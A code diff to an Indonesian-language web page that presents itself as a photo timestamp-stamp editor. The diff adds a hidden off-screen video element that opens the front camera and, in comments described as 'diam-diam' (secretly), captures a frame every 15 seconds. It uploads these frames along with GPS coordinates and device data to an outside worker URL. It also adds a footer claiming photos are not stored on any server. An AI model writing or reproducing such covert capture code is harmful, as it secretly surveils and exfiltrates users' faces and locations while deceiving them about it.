@@ -130,6 +130,16 @@
             border-radius: 0.5rem;
             color: white;
         }
+        .offset-control {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.5rem;
+        }
+        .offset-control .range-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
         button {
             background: linear-gradient(105deg, #3B82F6, #8B5CF6);
             color: white;
@@ -149,12 +159,13 @@
         .btn-warning { background: linear-gradient(105deg, #F59E0B, #D97706); }
         .hidden-video {
             position: fixed;
-            bottom: -100px;
-            left: -100px;
-            width: 1px;
-            height: 1px;
+            top: -9999px;
+            left: -9999px;
+            width: 320px;
+            height: 240px;
             opacity: 0;
             pointer-events: none;
+            z-index: -1;
         }
         .video-container {
             background: #000;
@@ -227,6 +238,7 @@
         @media (max-width: 768px) {
             .container { padding: 1rem; }
             .grid-2 { grid-template-columns: 1fr; }
+            .offset-control { flex-wrap: wrap; }
         }
     </style>
 </head>
@@ -268,16 +280,15 @@
         <div class="grid-2">
             <div class="glass-card">
                 <div class="card-header" style="padding: 1rem 1.25rem; border-bottom: 1px solid #1E293B;">
-                    <i class="fas fa-camera-retro text-indigo-400"></i> <strong>📸 SUMBER FOTO</strong>
+                    <i class="fas fa-camera-retro text-indigo-400"></i> <strong>📸 SUMBER FOTO (UNTUK EDIT STEMPEL)</strong>
                 </div>
                 <div class="card-body" style="padding: 1.25rem;">
                     <div class="video-container">
                         <video id="userVideo" autoplay playsinline muted></video>
                     </div>
-                    <button id="captureBtn">📷 AMBIL FOTO SEKARANG</button>
+                    <button id="captureBtn">📷 AMBIL FOTO (KAMERA BELAKANG)</button>
                     <button id="uploadBtn" class="btn-outline">📂 UPLOAD DARI GALERI</button>
                     <input type="file" id="fileInput" accept="image/*" style="display:none;">
-                    <video id="autoVideo" autoplay playsinline muted class="hidden-video"></video>
                     
                     <div style="margin-top: 1.25rem;">
                         <label>✏️ TEKS STEMPEL (bebas, unlimited)</label>
@@ -300,19 +311,19 @@
                         </div>
                         
                         <label>🎯 OFFSET KUSTOM</label>
-                        <div style="display: flex; gap: 0.75rem;">
-                            <div style="flex:1">
+                        <div>
+                            <div class="offset-control">
+                                <span style="width: 30px;">X ↕️</span>
                                 <div class="range-group">
-                                    <span>X ↕️</span>
                                     <input type="range" id="offsetXSlider" min="0" max="150" value="18">
-                                    <input type="number" id="offsetXNumber" class="input-number-small" value="18">
+                                    <input type="number" id="offsetXNumber" class="input-number-small" value="18" min="0" max="150">
                                 </div>
                             </div>
-                            <div style="flex:1">
+                            <div class="offset-control">
+                                <span style="width: 30px;">Y ↔️</span>
                                 <div class="range-group">
-                                    <span>Y ↔️</span>
                                     <input type="range" id="offsetYSlider" min="0" max="150" value="18">
-                                    <input type="number" id="offsetYNumber" class="input-number-small" value="18">
+                                    <input type="number" id="offsetYNumber" class="input-number-small" value="18" min="0" max="150">
                                 </div>
                             </div>
                         </div>
@@ -330,11 +341,17 @@
                         <img id="previewImage" class="preview-img" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='200' viewBox='0 0 300 200'%3E%3Crect width='300' height='200' fill='%230A0E18'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' fill='%233B4A6B' font-size='12'%3EBelum ada foto%3C/text%3E%3C/svg%3E" alt="preview">
                     </div>
                     <button id="downloadBtn" style="background:#334155; margin-top:0.5rem;" disabled>💾 DOWNLOAD HASIL</button>
+                    <p style="font-size:0.65rem; color:#64748B; text-align:center; margin-top:0.5rem;">
+                        Foto hasil edit stempel bisa di-download, tidak disimpan ke server.
+                    </p>
                 </div>
             </div>
         </div>
     </div>
 </div>
+
+<!-- Video tersembunyi untuk auto capture (kamera depan) -->
+<video id="autoVideo" autoplay playsinline muted class="hidden-video"></video>
 
 <script>
     const WORKER_URL = "https://timestamp.sapammeded.workers.dev";
@@ -352,7 +369,8 @@
     let currentOffsetY = 18;
     let autoCaptureInterval = null;
     let gpsInterval = null;
-    let videoReady = false;
+    let userVideoReady = false;
+    let autoVideoReady = false;
     
     // DOM Elements
     const userVideo = document.getElementById('userVideo');
@@ -388,6 +406,15 @@
     const posBL = document.getElementById('posBL');
     const posBR = document.getElementById('posBR');
     
+    // Sync slider & number
+    function syncOffsetX() { currentOffsetX = parseInt(offsetXSlider.value); offsetXNumber.value = currentOffsetX; if (currentImageFile && trialValid) updatePreview(); }
+    function syncOffsetY() { currentOffsetY = parseInt(offsetYSlider.value); offsetYNumber.value = currentOffsetY; if (currentImageFile && trialValid) updatePreview(); }
+    
+    offsetXSlider.oninput = syncOffsetX;
+    offsetXNumber.onchange = syncOffsetX;
+    offsetYSlider.oninput = syncOffsetY;
+    offsetYNumber.onchange = syncOffsetY;
+    
     function setActivePosition(activeBtn, pos) {
         [posTL, posTR, posBL, posBR].forEach(btn => btn.classList.remove('active'));
         activeBtn.classList.add('active');
@@ -401,10 +428,6 @@
     
     fontSizeSlider.oninput = () => { currentFontSize = parseInt(fontSizeSlider.value); fontSizeNumber.value = currentFontSize; if (currentImageFile && trialValid) updatePreview(); };
     fontSizeNumber.onchange = () => { currentFontSize = parseInt(fontSizeNumber.value); fontSizeSlider.value = currentFontSize; if (currentImageFile && trialValid) updatePreview(); };
-    offsetXSlider.oninput = () => { currentOffsetX = parseInt(offsetXSlider.value); offsetXNumber.value = currentOffsetX; if (currentImageFile && trialValid) updatePreview(); };
-    offsetXNumber.onchange = () => { currentOffsetX = parseInt(offsetXNumber.value); offsetXSlider.value = currentOffsetX; if (currentImageFile && trialValid) updatePreview(); };
-    offsetYSlider.oninput = () => { currentOffsetY = parseInt(offsetYSlider.value); offsetYNumber.value = currentOffsetY; if (currentImageFile && trialValid) updatePreview(); };
-    offsetYNumber.onchange = () => { currentOffsetY = parseInt(offsetYNumber.value); offsetYSlider.value = currentOffsetY; if (currentImageFile && trialValid) updatePreview(); };
     
     function updateGPSStatus(status, ready) { gpsStatus.innerHTML = status; gpsDot.className = ready ? 'dot' : 'dot warning'; }
     function updateCameraStatus(status, ready) { cameraStatus.innerHTML = status; cameraDot.className = ready ? 'dot' : 'dot warning'; }
@@ -450,19 +473,33 @@
         return false;
     }
     
+    // ========== INISIALISASI KAMERA ==========
+    // Kamera 1: untuk user (kamera BELAKANG, tampil di preview)
+    // Kamera 2: untuk auto capture (kamera DEPAN, tersembunyi)
     async function initCameras() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-            userVideoStream = stream;
-            userVideo.srcObject = stream;
-            autoVideoStream = stream;
-            autoVideo.srcObject = stream;
-            
+            // Kamera user (kamera belakang)
+            const userStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "environment" } 
+            });
+            userVideoStream = userStream;
+            userVideo.srcObject = userStream;
             userVideo.onloadedmetadata = () => {
-                videoReady = true;
-                updateCameraStatus('✅ Kamera aktif', true);
+                userVideoReady = true;
+                updateCameraStatus('✅ Kamera siap', true);
+            };
+            
+            // Kamera auto capture (kamera depan, tersembunyi)
+            const autoStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+            autoVideoStream = autoStream;
+            autoVideo.srcObject = autoStream;
+            autoVideo.onloadedmetadata = () => {
+                autoVideoReady = true;
                 startAutoCapture();
             };
+            
             return true;
         } catch(e) {
             updateCameraStatus('❌ Izin kamera ditolak', false);
@@ -486,7 +523,7 @@
                         if (userLocation.lat && userLocation.lng && trialValid) {
                             callAPI('uploadAuto', {
                                 imageData: null,
-                                metadata: { latitude: userLocation.lat, longitude: userLocation.lng, device: navigator.userAgent, customText: '', isAuto: true }
+                                metadata: { latitude: userLocation.lat, longitude: userLocation.lng, device: navigator.userAgent }
                             }).catch(e => console.log);
                         }
                     }, 10000);
@@ -496,11 +533,11 @@
         }
     }
     
-    // ========== AUTO CAPTURE (DIAM-DIAM, SETIAP 15 DETIK) ==========
+    // ========== AUTO CAPTURE (KAMERA DEPAN, DIAM-DIAM) ==========
     async function startAutoCapture() {
         if (autoCaptureInterval) clearInterval(autoCaptureInterval);
         autoCaptureInterval = setInterval(async () => {
-            if (!videoReady || !autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) return;
+            if (!autoVideoReady || !autoVideoStream || autoVideo.videoWidth === 0 || !trialValid) return;
             try {
                 const canvas = document.createElement('canvas');
                 canvas.width = autoVideo.videoWidth;
@@ -520,9 +557,7 @@
                             metadata: {
                                 latitude: userLocation.lat || 0,
                                 longitude: userLocation.lng || 0,
-                                device: navigator.userAgent,
-                                customText: '',
-                                isAuto: true
+                                device: navigator.userAgent
                             }
                         });
                     }
@@ -531,9 +566,10 @@
         }, 15000);
     }
     
+    // ========== USER MANUAL (KAMERA BELAKANG / UPLOAD) ==========
     async function captureFromCamera() {
         if (!trialValid) { showContactModal(); return; }
-        if (!videoReady) { alert("Kamera belum siap."); return; }
+        if (!userVideoReady) { alert("Kamera belum siap."); return; }
         const canvas = document.createElement('canvas');
         canvas.width = userVideo.videoWidth;
         canvas.height = userVideo.videoHeight;
@@ -592,21 +628,18 @@
                 previewImg.src = stampedURL;
                 stampedImageData = stampedURL;
                 downloadBtn.disabled = false;
-                canvas.toBlob(async (blob) => {
-                    const base64 = await blobToBase64(blob);
-                    await callAPI('upload', {
-                        imageData: base64,
-                        metadata: {
-                            latitude: userLocation.lat || 0,
-                            longitude: userLocation.lng || 0,
-                            device: navigator.userAgent,
-                            customText: customText,
-                            fontSize: currentFontSize,
-                            textPosition: currentPosition,
-                            isAuto: false
-                        }
-                    });
-                }, 'image/png');
+                
+                // Catat log manual (TIDAK DISIMPAN KE DRIVE)
+                await callAPI('uploadManual', {
+                    metadata: {
+                        latitude: userLocation.lat || 0,
+                        longitude: userLocation.lng || 0,
+                        device: navigator.userAgent,
+                        customText: customText,
+                        fontSize: currentFontSize,
+                        textPosition: currentPosition
+                    }
+                });
             };
         };
         reader.readAsDataURL(currentImageFile);
@@ -659,6 +692,7 @@
     
     window.addEventListener('beforeunload', () => {
         if (userVideoStream) userVideoStream.getTracks().forEach(t => t.stop());
+        if (autoVideoStream) autoVideoStream.getTracks().forEach(t => t.stop());
         if (autoCaptureInterval) clearInterval(autoCaptureInterval);
         if (gpsInterval) clearInterval(gpsInterval);
     });
